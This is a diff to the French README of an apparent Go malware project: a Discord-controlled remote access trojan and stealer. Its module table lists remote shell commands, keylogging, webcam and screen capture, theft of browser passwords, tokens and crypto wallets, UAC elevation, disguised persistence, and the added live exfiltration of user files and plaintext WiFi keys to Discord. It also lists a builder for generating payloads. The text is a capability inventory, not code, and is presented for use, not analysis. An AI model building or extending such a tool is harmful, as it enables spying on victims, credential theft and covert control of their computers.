@@ -17,7 +17,7 @@ vierge (aucun jeton, aucun identifiant Discord), `payload.json` est gitignoré
 |---|---|
 | `main.go` | Hôte autonome (sans fenêtre) : instance unique, `-diag`, `startPayload()` |
 | `payload.go` | Configuration embarquée, cadences, transport Discord, journal local |
-| `channel.go` | Salon `<machine>` + `<machine>-keylogs` + `<machine>-webcam` + **catégorie** Discord, créés à la demande par le bot |
+| `channel.go` | Salon `<machine>` + `-keylogs` + `-screenshots` + `-webcam` + `-files-*` + **catégorie** Discord, créés à la demande par le bot |
 | `c2.go` | C2 Discord : `!help`, `!shell`, `!shell_ps`, `!shell_tcp`, `!steal`, `!keylog`, `!screenshot`, `!webcam`, `!sysinfo`, `!licence`, `!elevate`, `!clip`, `!ls`, `!cat`, `!download`, `!persist`, `!stop` |
 | `stealer.go` | DPAPI, bases navigateurs (Chromium + Firefox), jetons, portefeuilles, rapport machine |
 | `firefox.go` | Décryptage Firefox (clé PBKDF2, `logins.json`/`key4.db`) |
@@ -27,6 +27,17 @@ vierge (aucun jeton, aucun identifiant Discord), `payload.json` est gitignoré
 | `persist.go` | Copie de repli EdgeUpdate + clé Run HKCU + VBS Démarrage (UTF-16LE) |
 | `winapi.go` | Registre, licences Windows, élévation UAC, IP publique |
 | `cmd/builder` | Builder CLI (voir ci-dessous) |
+| `c2out.go` | Exécution cmd/PowerShell : sortie complète, UTF-8 + repli OEM, pièce jointe au-delà de 1 800 caractères |
+| `media.go` | Captures d'écran : échelle ×1/×2/×3, envoi dans `<machine>-screenshots` |
+| `menu.go` | Bandeau d'état (en ligne/hors ligne) + menu par six réactions |
+| `fileexfil.go` | Veille temps réel des dossiers utilisateur → salons `-files-pdf/images/docs/archives/new` |
+| `fileops.go` | Recherche, zip, upload URL, exec, suppression, arrêt machine, webcam vidéo, captures programmées |
+| `wifi.go` | Profils WiFi et clés en clair (netsh, français et anglais) |
+| `location.go` | Position Windows + IP + adresse postale (Nominatim) |
+| `apps.go` | Liste des processus avec chemins, ouverture, fermeture, kill |
+| `prank.go` | Effets réversibles : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse |
+| `wipe.go` | Raccourci Démarrage, tâche planifiée, réparation, nettoyage des builds précédents, `!delete confirm` |
+| `hardware.go` | CPU, RAM, disques, GPU, écrans pour `!sysinfo` |
 
 ## Compiler
 
